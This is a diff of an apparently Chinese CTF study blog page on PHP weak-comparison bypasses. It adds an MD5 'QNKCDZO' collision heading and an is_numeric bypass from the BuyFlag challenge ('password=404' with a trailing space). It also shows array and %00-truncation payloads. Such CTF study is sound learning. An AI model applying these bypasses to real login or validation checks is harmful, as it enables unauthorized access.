@@ -444,7 +444,7 @@ Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%
 <span class="token punctuation">}</span>
 <span class="token delimiter">?></span></code></pre>
 <p>payload</p>
-<pre><code>/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></pre><h4 id="4-2"><a href="#4-2" class="headerlink" title="4.2"></a>4.2</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre><code>/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></pre><h4 id="4-2、QNKCDZO碰撞"><a href="#4-2、QNKCDZO碰撞" class="headerlink" title="4.2、QNKCDZO碰撞"></a>4.2、QNKCDZO碰撞</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -541,7 +541,17 @@ s878926199a</code></pre><h4 id="4-3、还是数组绕过"><a href="#4-3、还是
 <pre><code>1-利用数组绕过这两个函数
 ?password[]=1
 2-%00截断绕过正则匹配
-?password=1e9%00*-*</code></pre><h3 id="tps"><a href="#tps" class="headerlink" title="tps:"></a>tps:</h3><p>文件包含是否支持%00截断取决于：<br>PHP版本&lt;=5.2 可以使用%00进行截断。</p>
+?password=1e9%00*-*</code></pre><h4 id="4-7、is-number"><a href="#4-7、is-number" class="headerlink" title="4.7、is_number"></a>4.7、is_number</h4><p>[极客大挑战 2019]BuyFlag</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>payload<br><code>password=404</code>(后面加一个空格)</p>
+<h3 id="tps-00"><a href="#tps-00" class="headerlink" title="tps:%00"></a>tps:%00</h3><p>文件包含是否支持%00截断取决于：<br>PHP版本&lt;=5.2 可以使用%00进行截断。</p>
 
             </div>
             <hr/>
@@ -900,7 +910,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">157.1k</span>&nbsp;字
+                class="white-color">160.1k</span>&nbsp;字
             
             
             
